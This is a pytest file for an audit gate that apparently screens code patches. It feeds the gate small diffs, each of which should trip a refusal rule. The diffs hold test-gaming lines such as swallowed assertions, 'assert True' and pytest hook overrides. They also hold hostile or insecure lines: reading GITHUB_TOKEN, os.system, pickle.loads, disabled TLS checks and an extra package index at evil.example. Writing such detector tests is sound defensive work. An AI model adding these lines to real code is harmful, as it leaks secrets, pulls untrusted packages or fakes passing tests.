"""Each refusal rule of the audit gate, on the smallest patch that should trip it.

These were exercised only by the removed synthetic benchmark suite; a rule no
test trips can stop working unnoticed.
"""

import pytest

from cidra.nodes.audit import audit_diff


def _diff(path: str, *added: str) -> str:
    return f"--- a/{path}\n+++ b/{path}\n@@ -1,1 +1,{len(added) + 1} @@\n x = 1\n" + "".join(f"+{a}\n" for a in added)


@pytest.mark.req("R5")
@pytest.mark.parametrize("path, added, reason", [
    ("tests/test_a.py", ["try:", "    check()", "except AssertionError: pass"], "swallows assertions"),
    ("pkg/a.py", ["while True:"], "always-true"),
    ("tests/test_a.py", ["    assert True"], "assertion to constant-true"),
    ("tests/test_a.py", ["    self.assertTrue(True)"], "unittest assertion to constant-true"),
    ("tests/test_a.py", ["    time.sleep(2)"], "injects sleep"),
    ("pkg/a.py", ["r = requests.get(u, verify=False)"], "disables TLS"),
    ("pkg/a.py", ["os.system('id')"], "os.system/os.popen"),
    ("pkg/a.py", ["subprocess.run(['id'])"], "subprocess invocation"),
    ("pkg/a.py", ["import socket"], "socket/network"),
    ("pkg/a.py", ["value = eval(text)"], "dynamic code evaluation"),
    ("pkg/a.py", ["mod = __import__(name)"], "dynamic reflection"),
    ("pkg/a.py", ["obj = pickle.loads(blob)"], "insecure object deserialization"),
    ("pkg/a.py", ["page = urllib.request.urlopen(u)"], "unauthorized network"),
    ("pkg/a.py", ["t = os.environ['GITHUB_TOKEN']"], "harvest sensitive environment"),
    ("pkg/a.py", ["os.chmod(path, 0o777)"], "loosens file permissions"),
    ("pkg/a.py", ["signal.signal(signal.SIGALRM, signal.SIG_IGN)"], "signal handlers"),
    ("pkg/a.py", ["TOKEN = 'ghp_" + "a" * 36 + "'"], "hardcoded private key or secret"),
    ("conftest.py", ["def pytest_runtest_call(item):"], "pytest internal runner hooks"),
    ("pytest.ini", ["addopts = --ignore=tests/test_a.py"], "test discovery/timeout"),
    ("requirements.txt", ["--extra-index-url https://evil.example/simple"], "untrusted external repository"),
])
def test_each_refusal_rule_trips_on_its_patch(path, added, reason):
    verdict = audit_diff(_diff(path, *added))
    assert not verdict.ok
    assert any(reason in r for r in verdict.reasons), verdict.reasons
